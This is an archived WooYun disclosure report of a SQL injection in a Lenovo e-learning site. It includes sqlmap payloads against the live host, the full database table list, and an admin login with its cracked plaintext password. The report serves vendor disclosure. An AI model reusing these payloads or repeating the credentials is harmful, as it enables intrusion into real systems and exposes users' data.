<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		联想安全问题十某分站伪静态注射（101227用户数据面临危险，成功进后台）  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		联想安全问题十某分站伪静态注射（101227用户数据面临危险，成功进后台）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/VIP">VIP</a> 
</li><li>提交时间：		2013-08-27 08:50</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-08-27：	细节已通知厂商并且等待厂商处理中<br/>
									2013-08-27：	厂商已经确认，细节仅向厂商公开<br/>
									2013-09-06：	细节向核心白帽子及相关领域专家公开<br/>
									2013-09-16：	细节向普通白帽子公开<br/>
									2013-09-26：	细节向实习白帽子公开<br/>
									2013-10-11：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">漏洞好多哦，这次很幸运，不是盲注。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">注射点：<br />
<br />
</p><pre><code>http://e-learning.lenovo.com.cn/user/registration/ajax/group/3/shop/2777</code></pre><p class='detail'><br />
<br />
最后一个参数存在注射漏洞 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>---<br />
Place: URI<br />
Parameter: #1*<br />
    Type: boolean-based blind<br />
    Title: AND boolean-based blind - WHERE or HAVING clause<br />
    Payload: http://e-learning.lenovo.com.cn:80/user/registration/ajax/group/3/s<br />
hop/2777 AND 4534=4534/<br />
<br />
    Type: error-based<br />
    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause<br />
    Payload: http://e-learning.lenovo.com.cn:80/user/registration/ajax/group/3/s<br />
hop/2777 AND (SELECT 2454 FROM(SELECT COUNT(*),CONCAT(0x71646d7071,(SELECT (CASE<br />
 WHEN (2454=2454) THEN 1 ELSE 0 END)),0x7177767a71,FLOOR(RAND(0)*2))x FROM INFOR<br />
MATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)/<br />
<br />
    Type: UNION query<br />
    Title: MySQL UNION query (NULL) - 1 column<br />
    Payload: http://e-learning.lenovo.com.cn:80/user/registration/ajax/group/3/s<br />
hop/-2768 UNION ALL SELECT CONCAT(0x71646d7071,0x456279506c5659574f6b,0x7177767a<br />
71)#/<br />
<br />
    Type: stacked queries<br />
    Title: MySQL &gt; 5.0.11 stacked queries<br />
    Payload: http://e-learning.lenovo.com.cn:80/user/registration/ajax/group/3/s<br />
hop/2777; SELECT SLEEP(5)-- /<br />
<br />
    Type: AND/OR time-based blind<br />
    Title: MySQL &gt; 5.0.11 AND time-based blind<br />
    Payload: http://e-learning.lenovo.com.cn:80/user/registration/ajax/group/3/s<br />
hop/2777 AND SLEEP(5)/<br />
---</code></pre><p class='detail'><br />
<br />
</p><pre><code>web application technology: Apache 2.2.0, PHP 5.2.14<br />
back-end DBMS: MySQL 5.0</code></pre><p class='detail'><br />
<br />
当前用户<br />
<br />
</p><pre><code>current user:    &#039;lenovo@%&#039;</code></pre><p class='detail'><br />
<br />
当前库<br />
<br />
</p><pre><code>current database:    &#039;lenovo&#039;</code></pre><p class='detail'><br />
<br />
696个表<br />
<br />
</p><pre><code>Database: lenovo<br />
[696 tables]<br />
+-----------------------------------+<br />
| keys                              |<br />
| active                            |<br />
| active_type                       |<br />
| active_up                         |<br />
| active_up_user                    |<br />
| active_user                       |<br />
| ad_manage                         |<br />
| admin_log                         |<br />
| admin_users                       |<br />
| am_news                           |<br />
| area                              |<br />
| area_cost                         |<br />
| area_credits                      |<br />
| area_main                         |<br />
| area_photo                        |<br />
| area_suggest                      |<br />
| area_teacher                      |<br />
| ask                               |<br />
| ask_answer                        |<br />
| ask_comment                       |<br />
| ask_good                          |<br />
| ask_score_detail                  |<br />
| ask_search_keyword                |<br />
| ask_too                           |<br />
| ask_user_reply_detail             |<br />
| assessquarter                     |<br />
| autumnsurvey11                    |<br />
| autumnsurvey12                    |<br />
| bao_click_record                  |<br />
| bao_click_record_20110829         |<br />
| bao_click_record_201112           |<br />
| bao_click_record_20120117         |<br />
| bao_history                       |<br />
| bao_map                           |<br />
| bao_q_record                      |<br />
| bao_q_record_20110829             |<br />
| bao_q_record_20120109             |<br />
| bao_q_record_20120117             |<br />
| bao_record                        |<br />
| bao_record_20110829               |<br />
| bao_record_20120109               |<br />
| bao_record_20120117               |<br />
| bao_session                       |<br />
| bbs_elearning_groups              |<br />
| bind_record                       |<br />
| cdb_access                        |<br />
| cdb_activities                    |<br />
| cdb_activityapplies               |<br />
| cdb_addons                        |<br />
| cdb_adminactions                  |<br />
| cdb_admincustom                   |<br />
| cdb_admingroups                   |<br />
| cdb_adminnotes                    |<br />
| cdb_adminsessions                 |<br />
| cdb_advertisements                |<br />
| cdb_announcements                 |<br />
| cdb_assessment                    |<br />
| cdb_assessment_2011q1             |<br />
| cdb_attachmentfields              |<br />
| cdb_attachments                   |<br />
| cdb_attachpaymentlog              |<br />
| cdb_attachtypes                   |<br />
| cdb_banned                        |<br />
| cdb_bbcodes                       |<br />
| cdb_caches                        |<br />
| cdb_creditslog                    |<br />
| cdb_crons                         |<br />
| cdb_debateposts                   |<br />
| cdb_debates                       |<br />
| cdb_failedlogins                  |<br />
| cdb_faqs                          |<br />
| cdb_favoriteforums                |<br />
| cdb_favorites                     |<br />
| cdb_favoritethreads               |<br />
| cdb_feeds                         |<br />
| cdb_forumfields                   |<br />
| cdb_forumlinks                    |<br />
| cdb_forumrecommend                |<br />
| cdb_forums                        |<br />
| cdb_imagetypes                    |<br />
| cdb_invites                       |<br />
| cdb_itempool                      |<br />
| cdb_magiclog                      |<br />
| cdb_magicmarket                   |<br />
| cdb_magics                        |<br />
| cdb_medallog                      |<br />
| cdb_medals                        |<br />
| cdb_memberfields                  |<br />
| cdb_membermagics                  |<br />
| cdb_memberrecommend               |<br />
| cdb_members                       |<br />
| cdb_memberspaces                  |<br />
| cdb_moderators                    |<br />
| cdb_modworks                      |<br />
| cdb_mytasks                       |<br />
| cdb_navs                          |<br />
| cdb_onlinelist                    |<br />
| cdb_onlinetime                    |<br />
| cdb_orders                        |<br />
| cdb_paymentlog                    |<br />
| cdb_pluginhooks                   |<br />
| cdb_plugins                       |<br />
| cdb_pluginvars                    |<br />
| cdb_polloptions                   |<br />
| cdb_polls                         |<br />
| cdb_postposition                  |<br />
| cdb_posts                         |<br />
| cdb_profilefields                 |<br />
| cdb_projects                      |<br />
| cdb_promotions                    |<br />
| cdb_prompt                        |<br />
| cdb_promptmsgs                    |<br />
| cdb_prompttype                    |<br />
| cdb_ranks                         |<br />
| cdb_ratelog                       |<br />
| cdb_regips                        |<br />
| cdb_relatedthreads                |<br />
| cdb_reportlog                     |<br />
| cdb_request                       |<br />
| cdb_rewardlog                     |<br />
| cdb_rsscaches                     |<br />
| cdb_searchindex                   |<br />
| cdb_sessions                      |<br />
| cdb_settings                      |<br />
| cdb_smilies                       |<br />
| cdb_spacecaches                   |<br />
| cdb_stats                         |<br />
| cdb_statvars                      |<br />
| cdb_styles                        |<br />
| cdb_stylevars                     |<br />
| cdb_tags                          |<br />
| cdb_tasks                         |<br />
| cdb_taskvars                      |<br />
| cdb_templates                     |<br />
| cdb_threads                       |<br />
| cdb_threadsmod                    |<br />
| cdb_threadtags                    |<br />
| cdb_threadtypes                   |<br />
| cdb_tradecomments                 |<br />
| cdb_tradelog                      |<br />
| cdb_tradeoptionvars               |<br />
| cdb_trades                        |<br />
| cdb_typemodels                    |<br />
| cdb_typeoptions                   |<br />
| cdb_typeoptionvars                |<br />
| cdb_typevars                      |<br />
| cdb_uc_admins                     |<br />
| cdb_uc_applications               |<br />
| cdb_uc_badwords                   |<br />
| cdb_uc_domains                    |<br />
| cdb_uc_failedlogins               |<br />
| cdb_uc_feeds                      |<br />
| cdb_uc_friends                    |<br />
| cdb_uc_mailqueue                  |<br />
| cdb_uc_memberfields               |<br />
| cdb_uc_members                    |<br />
| cdb_uc_mergemembers               |<br />
| cdb_uc_newpm                      |<br />
| cdb_uc_notelist                   |<br />
| cdb_uc_pms                        |<br />
| cdb_uc_protectedmembers           |<br />
| cdb_uc_settings                   |<br />
| cdb_uc_sqlcache                   |<br />
| cdb_uc_tags                       |<br />
| cdb_uc_vars                       |<br />
| cdb_usergroups                    |<br />
| cdb_validating                    |<br />
| cdb_warnings                      |<br />
| cdb_words                         |<br />
| cmamonthshop                      |<br />
| contest                           |<br />
| control                           |<br />
| control_type                      |<br />
| course                            |<br />
| course_record                     |<br />
| course_record_log                 |<br />
| course_type                       |<br />
| courseware                        |<br />
| courseware_comment                |<br />
| courseware_detail                 |<br />
| courseware_survey                 |<br />
| datum                             |<br />
| datum_sort                        |<br />
| dealer                            |<br />
| dict_card_lc                      |<br />
| dict_card_lz                      |<br />
| dict_card_user                    |<br />
| dict_card_zd                      |<br />
| dict_shop                         |<br />
| dict_sys_user                     |<br />
| downfile                          |<br />
| ec3_shop                          |<br />
| ec3_user                          |<br />
| exam_paper                        |<br />
| exam_paper_keys                   |<br />
| exam_paper_questions              |<br />
| extra_power                       |<br />
| fy12q4cloth                       |<br />
| gift_record                       |<br />
| greensurvey12                     |<br />
| group_authoritys                  |<br />
| groups                            |<br />
| idea                              |<br />
| idea_config                       |<br />
| idea_config_bak                   |<br />
| idea_forbid_log                   |<br />
| idea_pic                          |<br />
| idea_pw                           |<br />
| idea_pw_vote                      |<br />
| idea_vote                         |<br />
| idea_vote_set                     |<br />
| ideaother                         |<br />
| ideaother_config                  |<br />
| ideaother_forbid_log              |<br />
| ideaother_pic                     |<br />
| ideaother_vote                    |<br />
| ideaother_vote_set                |<br />
| ideaother_vote_set_copy           |<br />
| ideaother_voter                   |<br />
| intel2_click_record               |<br />
| intel2_click_record_copy          |<br />
| intel2_click_record_new           |<br />
| intel2_history                    |<br />
| intel2_map                        |<br />
| intel2_map_copy                   |<br />
| intel2_q_record                   |<br />
| intel2_q_record_copy              |<br />
| intel2_record                     |<br />
| intel2_record_copy                |<br />
| intel2_session                    |<br />
| intel_click_record                |<br />
| intel_click_record_copy           |<br />
| intel_history                     |<br />
| intel_map                         |<br />
| intel_map_copy                    |<br />
| intel_q_record                    |<br />
| intel_record                      |<br />
| intel_session                     |<br />
| irep_course                       |<br />
| irep_quiz                         |<br />
| kaoshi                            |<br />
| keysnew                           |<br />
| lbs_case                          |<br />
| lbs_case_config                   |<br />
| lbs_weekly                        |<br />
| lbsuserlist                       |<br />
| leadvise                          |<br />
| learning_record                   |<br />
| learning_record_log               |<br />
| lesurvey                          |<br />
| lphone_shops                      |<br />
| match_config                      |<br />
| match_gift                        |<br />
| match_gift_record                 |<br />
| match_pic                         |<br />
| match_record                      |<br />
| match_result                      |<br />
| match_result_bak                  |<br />
| match_score                       |<br />
| match_top                         |<br />
| match_top_bak                     |<br />
| message                           |<br />
| msmadvise                         |<br />
| news                              |<br />
| newtraining                       |<br />
| notice                            |<br />
| notice_board                      |<br />
| notice_record                     |<br />
| notice_record_2012                |<br />
| notice_record_2013                |<br />
| nplay_session                     |<br />
| operations                        |<br />
| order_detail                      |<br />
| order_record                      |<br />
| pad_address                       |<br />
| pad_click_record                  |<br />
| pad_history                       |<br />
| pad_map                           |<br />
| pad_q_record                      |<br />
| pad_record                        |<br />
| pad_record_copy                   |<br />
| pad_session                       |<br />
| place                             |<br />
| positions                         |<br />
| power                             |<br />
| pre_common_admincp_cmenu          |<br />
| pre_common_admincp_group          |<br />
| pre_common_admincp_member         |<br />
| pre_common_admincp_perm           |<br />
| pre_common_admincp_session        |<br />
| pre_common_admingroup             |<br />
| pre_common_adminnote              |<br />
| pre_common_advertisement          |<br />
| pre_common_advertisement_custom   |<br />
| pre_common_banned                 |<br />
| pre_common_block                  |<br />
| pre_common_block_favorite         |<br />
| pre_common_block_item             |<br />
| pre_common_block_item_data        |<br />
| pre_common_block_permission       |<br />
| pre_common_block_pic              |<br />
| pre_common_block_style            |<br />
| pre_common_block_xml              |<br />
| pre_common_cache                  |<br />
| pre_common_card                   |<br />
| pre_common_card_log               |<br />
| pre_common_card_type              |<br />
| pre_common_connect_guest          |<br />
| pre_common_credit_log             |<br />
| pre_common_credit_log_field       |<br />
| pre_common_credit_rule            |<br />
| pre_common_credit_rule_log        |<br />
| pre_common_credit_rule_log_field  |<br />
| pre_common_cron                   |<br />
| pre_common_devicetoken            |<br />
| pre_common_district               |<br />
| pre_common_diy_data               |<br />
| pre_common_domain                 |<br />
| pre_common_failedlogin            |<br />
| pre_common_friendlink             |<br />
| pre_common_grouppm                |<br />
| pre_common_invite                 |<br />
| pre_common_magic                  |<br />
| pre_common_magiclog               |<br />
| pre_common_mailcron               |<br />
| pre_common_mailqueue              |<br />
| pre_common_member                 |<br />
| pre_common_member_action_log      |<br />
| pre_common_member_connect         |<br />
| pre_common_member_count           |<br />
| pre_common_member_crime           |<br />
| pre_common_member_field_forum     |<br />
| pre_common_member_field_home      |<br />
| pre_common_member_forum_buylog    |<br />
| pre_common_member_grouppm         |<br />
| pre_common_member_log             |<br />
| pre_common_member_magic           |<br />
| pre_common_member_medal           |<br />
| pre_common_member_newprompt       |<br />
| pre_common_member_profile         |<br />
| pre_common_member_profile_setting |<br />
| pre_common_member_security        |<br />
| pre_common_member_stat_field      |<br />
| pre_common_member_status          |<br />
| pre_common_member_validate        |<br />
| pre_common_member_verify          |<br />
| pre_common_member_verify_info     |<br />
| pre_common_myapp                  |<br />
| pre_common_myinvite               |<br />
| pre_common_mytask                 |<br />
| pre_common_nav                    |<br />
| pre_common_onlinetime             |<br />
| pre_common_optimizer              |<br />
| pre_common_patch                  |<br />
| pre_common_plugin                 |<br />
| pre_common_pluginvar              |<br />
| pre_common_process                |<br />
| pre_common_regip                  |<br />
| pre_common_relatedlink            |<br />
| pre_common_report                 |<br />
| pre_common_searchindex            |<br />
| pre_common_secquestion            |<br />
| pre_common_session                |<br />
| pre_common_setting                |<br />
| pre_common_smiley                 |<br />
| pre_common_sphinxcounter          |<br />
| pre_common_stat                   |<br />
| pre_common_statuser               |<br />
| pre_common_style                  |<br />
| pre_common_stylevar               |<br />
| pre_common_syscache               |<br />
| pre_common_tag                    |<br />
| pre_common_tagitem                |<br />
| pre_common_task                   |<br />
| pre_common_taskvar                |<br />
| pre_common_template               |<br />
| pre_common_template_block         |<br />
| pre_common_template_permission    |<br />
| pre_common_uin_black              |<br />
| pre_common_usergroup              |<br />
| pre_common_usergroup_field        |<br />
| pre_common_visit                  |<br />
| pre_common_word                   |<br />
| pre_common_word_type              |<br />
| pre_connect_disktask              |<br />
| pre_connect_feedlog               |<br />
| pre_connect_memberbindlog         |<br />
| pre_connect_postfeedlog           |<br />
| pre_connect_tthreadlog            |<br />
| pre_forum_access                  |<br />
| pre_forum_activity                |<br />
| pre_forum_activityapply           |<br />
| pre_forum_announcement            |<br />
| pre_forum_attachment              |<br />
| pre_forum_attachment_0            |<br />
| pre_forum_attachment_1            |<br />
| pre_forum_attachment_2            |<br />
| pre_forum_attachment_3            |<br />
| pre_forum_attachment_4            |<br />
| pre_forum_attachment_5            |<br />
| pre_forum_attachment_6            |<br />
| pre_forum_attachment_7            |<br />
| pre_forum_attachment_8            |<br />
| pre_forum_attachment_9            |<br />
| pre_forum_attachment_exif         |<br />
| pre_forum_attachment_unused       |<br />
| pre_forum_attachtype              |<br />
| pre_forum_bbcode                  |<br />
| pre_forum_collection              |<br />
| pre_forum_collectioncomment       |<br />
| pre_forum_collectionfollow        |<br />
| pre_forum_collectioninvite        |<br />
| pre_forum_collectionrelated       |<br />
| pre_forum_collectionteamworker    |<br />
| pre_forum_collectionthread        |<br />
| pre_forum_creditslog              |<br />
| pre_forum_debate                  |<br />
| pre_forum_debatepost              |<br />
| pre_forum_faq                     |<br />
| pre_forum_filter_post             |<br />
| pre_forum_forum                   |<br />
| pre_forum_forum_threadtable       |<br />
| pre_forum_forumfield              |<br />
| pre_forum_forumrecommend          |<br />
| pre_forum_groupcreditslog         |<br />
| pre_forum_groupfield              |<br />
| pre_forum_groupinvite             |<br />
| pre_forum_grouplevel              |<br />
| pre_forum_groupuser               |<br />
| pre_forum_hotreply_member         |<br />
| pre_forum_hotreply_number         |<br />
| pre_forum_imagetype               |<br />
| pre_forum_medal                   |<br />
| pre_forum_medallog                |<br />
| pre_forum_memberrecommend         |<br />
| pre_forum_moderator               |<br />
| pre_forum_modwork                 |<br />
| pre_forum_newthread               |<br />
| pre_forum_onlinelist              |<br />
| pre_forum_order                   |<br />
| pre_forum_poll                    |<br />
| pre_forum_polloption              |<br />
| pre_forum_polloption_image        |<br />
| pre_forum_pollvoter               |<br />
| pre_forum_post                    |<br />
| pre_forum_post_location           |<br />
| pre_forum_post_moderate           |<br />
| pre_forum_post_tableid            |<br />
| pre_forum_postcache               |<br />
| pre_forum_postcomment             |<br />
| pre_forum_postlog                 |<br />
| pre_forum_poststick               |<br />
| pre_forum_promotion               |<br />
| pre_forum_ratelog                 |<br />
| pre_forum_relatedthread           |<br />
| pre_forum_replycredit             |<br />
| pre_forum_rsscache                |<br />
| pre_forum_sofa                    |<br />
| pre_forum_spacecache              |<br />
| pre_forum_statlog                 |<br />
| pre_forum_thread                  |<br />
| pre_forum_thread_moderate         |<br />
| pre_forum_threadaddviews          |<br />
| pre_forum_threadcalendar          |<br />
| pre_forum_threadclass             |<br />
| pre_forum_threadclosed            |<br />
| pre_forum_threaddisablepos        |<br />
| pre_forum_threadhot               |<br />
| pre_forum_threadimage             |<br />
| pre_forum_threadlog               |<br />
| pre_forum_threadmod               |<br />
| pre_forum_threadpartake           |<br />
| pre_forum_threadpreview           |<br />
| pre_forum_threadprofile           |<br />
| pre_forum_threadprofile_group     |<br />
| pre_forum_threadrush              |<br />
| pre_forum_threadtype              |<br />
| pre_forum_trade                   |<br />
| pre_forum_tradecomment            |<br />
| pre_forum_tradelog                |<br />
| pre_forum_typeoption              |<br />
| pre_forum_typeoptionvar           |<br />
| pre_forum_typevar                 |<br />
| pre_forum_warning                 |<br />
| pre_home_album                    |<br />
| pre_home_album_category           |<br />
| pre_home_appcreditlog             |<br />
| pre_home_blacklist                |<br />
| pre_home_blog                     |<br />
| pre_home_blog_category            |<br />
| pre_home_blog_moderate            |<br />
| pre_home_blogfield                |<br />
| pre_home_class                    |<br />
| pre_home_click                    |<br />
| pre_home_clickuser                |<br />
| pre_home_comment                  |<br />
| pre_home_comment_moderate         |<br />
| pre_home_docomment                |<br />
| pre_home_doing                    |<br />
| pre_home_doing_moderate           |<br />
| pre_home_favorite                 |<br />
| pre_home_feed                     |<br />
| pre_home_feed_app                 |<br />
| pre_home_follow                   |<br />
| pre_home_follow_feed              |<br />
| pre_home_follow_feed_archiver     |<br />
| pre_home_friend                   |<br />
| pre_home_friend_request           |<br />
| pre_home_friendlog                |<br />
| pre_home_notification             |<br />
| pre_home_pic                      |<br />
| pre_home_pic_moderate             |<br />
| pre_home_picfield                 |<br />
| pre_home_poke                     |<br />
| pre_home_pokearchive              |<br />
| pre_home_share                    |<br />
| pre_home_share_moderate           |<br />
| pre_home_show                     |<br />
| pre_home_specialuser              |<br />
| pre_home_userapp                  |<br />
| pre_home_userappfield             |<br />
| pre_home_visitor                  |<br />
| pre_mobile_setting                |<br />
| pre_portal_article_content        |<br />
| pre_portal_article_count          |<br />
| pre_portal_article_moderate       |<br />
| pre_portal_article_related        |<br />
| pre_portal_article_title          |<br />
| pre_portal_article_trash          |<br />
| pre_portal_attachment             |<br />
| pre_portal_category               |<br />
| pre_portal_category_permission    |<br />
| pre_portal_comment                |<br />
| pre_portal_comment_moderate       |<br />
| pre_portal_rsscache               |<br />
| pre_portal_topic                  |<br />
| pre_portal_topic_pic              |<br />
| pre_security_evilpost             |<br />
| pre_security_eviluser             |<br />
| pre_security_failedlog            |<br />
| pre_ucenter_admins                |<br />
| pre_ucenter_applications          |<br />
| pre_ucenter_badwords              |<br />
| pre_ucenter_domains               |<br />
| pre_ucenter_failedlogins          |<br />
| pre_ucenter_feeds                 |<br />
| pre_ucenter_friends               |<br />
| pre_ucenter_mailqueue             |<br />
| pre_ucenter_memberfields          |<br />
| pre_ucenter_members               |<br />
| pre_ucenter_mergemembers          |<br />
| pre_ucenter_newpm                 |<br />
| pre_ucenter_notelist              |<br />
| pre_ucenter_pm_indexes            |<br />
| pre_ucenter_pm_lists              |<br />
| pre_ucenter_pm_members            |<br />
| pre_ucenter_pm_messages_0         |<br />
| pre_ucenter_pm_messages_1         |<br />
| pre_ucenter_pm_messages_2         |<br />
| pre_ucenter_pm_messages_3         |<br />
| pre_ucenter_pm_messages_4         |<br />
| pre_ucenter_pm_messages_5         |<br />
| pre_ucenter_pm_messages_6         |<br />
| pre_ucenter_pm_messages_7         |<br />
| pre_ucenter_pm_messages_8         |<br />
| pre_ucenter_pm_messages_9         |<br />
| pre_ucenter_protectedmembers      |<br />
| pre_ucenter_settings              |<br />
| pre_ucenter_sqlcache              |<br />
| pre_ucenter_tags                  |<br />
| pre_ucenter_vars                  |<br />
| province                          |<br />
| quarter                           |<br />
| questions                         |<br />
| questions_box                     |<br />
| questions_detail                  |<br />
| quiz                              |<br />
| rka_case                          |<br />
| rka_course_list                   |<br />
| rka_summary_periods               |<br />
| rka_talk                          |<br />
| rka_talk_cate                     |<br />
| rka_talk_copy                     |<br />
| rka_talk_periods                  |<br />
| rka_talk_vote                     |<br />
| rka_talk_vote_log                 |<br />
| rka_train                         |<br />
| rka_train_periods                 |<br />
| rka_train_summary                 |<br />
| rka_train_summary_pic             |<br />
| rka_train_users                   |<br />
| rka_train_vote                    |<br />
| rkalevel                          |<br />
| rkauserlist                       |<br />
| salestalk                         |<br />
| salestalk_num                     |<br />
| scadvise                          |<br />
| share                             |<br />
| share_record                      |<br />
| share_record_2012                 |<br />
| share_record_2013                 |<br />
| shop_cma201202                    |<br />
| shop_cma201202_bak                |<br />
| shop_target                       |<br />
| shopforum94                       |<br />
| shopforum94_list                  |<br />
| shopforum94_list_temp2            |<br />
| shopforum94top                    |<br />
| shops                             |<br />
| shops_copy201301112               |<br />
| shops_copy201301113               |<br />
| shops_flagship                    |<br />
| shops_level                       |<br />
| shops_seller                      |<br />
| shops_seller20121111              |<br />
| shops_seller20121122              |<br />
| shouke                            |<br />
| springsurvey12                    |<br />
| springsurvey13                    |<br />
| ss_log                            |<br />
| star                              |<br />
| summer_13_user                    |<br />
| summer_13_user_copy               |<br />
| summercloth                       |<br />
| summersurvey12                    |<br />
| summersurvey13                    |<br />
| super_sales                       |<br />
| survey                            |<br />
| survey25qa                        |<br />
| survey_notice                     |<br />
| survey_option                     |<br />
| survey_option_title               |<br />
| survey_vote                       |<br />
| t_train_file                      |<br />
| task2_answer                      |<br />
| task2_list                        |<br />
| task2_manager                     |<br />
| task2_mark                        |<br />
| task2_que                         |<br />
| task2_question1                   |<br />
| task2_status                      |<br />
| task2_user                        |<br />
| task_answer                       |<br />
| task_list                         |<br />
| task_manager                      |<br />
| task_mark                         |<br />
| task_que                          |<br />
| task_question31                   |<br />
| task_status                       |<br />
| task_user                         |<br />
| teacher_info                      |<br />
| teacher_train                     |<br />
| test_1                            |<br />
| test_1_1377186040                 |<br />
| test_type                         |<br />
| testing                           |<br />
| think_advise                      |<br />
| think_tmp                         |<br />
| tmp_idea_user                     |<br />
| tmp_user                          |<br />
| train_file                        |<br />
| trainsxdr                         |<br />
| tree_area                         |<br />
| tree_channel                      |<br />
| tree_shoptype                     |<br />
| tree_staff_type                   |<br />
| txzquserlist                      |<br />
| upgrade_user                      |<br />
| user_advise                       |<br />
| user_check                        |<br />
| user_credits                      |<br />
| user_credits_record               |<br />
| user_department                   |<br />
| user_lenovo_kaoshi                |<br />
| userforum93                       |<br />
| users                             |<br />
| users_20120802                    |<br />
| users_20121227copy                |<br />
| users_copy20130730                |<br />
| users_rka                         |<br />
| usersbaoming                      |<br />
| usersbaomingbiaotmp               |<br />
| usersbaominginfo                  |<br />
| usersbaomingtmp                   |<br />
| userskaoshi                       |<br />
| userskaoshi_bak                   |<br />
| userskaoshitmp                    |<br />
| userskaoshitmp_bak                |<br />
| verify_date                       |<br />
| verify_history                    |<br />
| wintercloth                       |<br />
| wintersurvey11                    |<br />
| wintersurvey12                    |<br />
| yellowadvise                      |<br />
| yellowsurvey11                    |<br />
| ytadvise                          |<br />
+-----------------------------------+</code></pre><p class='detail'><br />
<br />
看看用户表里的数据<br />
<br />
</p><pre><code>Database: lenovo<br />
+-------+---------+<br />
| Table | Entries |<br />
+-------+---------+<br />
| users | 101227  |<br />
+-------+---------+</code></pre><p class='detail'><br />
<br />
然后dump了管理员表，第一个md5解开了，成功进入后台<br />
<br />
用户名：admin 密码：lenovoadmin2010<br />
<br />
http://e-learning.lenovo.com.cn/admin/index<br />
<br />
<br />
<br />
 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">过滤吧 弱密码也改改 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/VIP" title="VIP">VIP</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035355" title="联想安全问题十某分站伪静态注射（101227用户数据面临危险，成功进后台）">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-08-27 13:59</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="35355";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
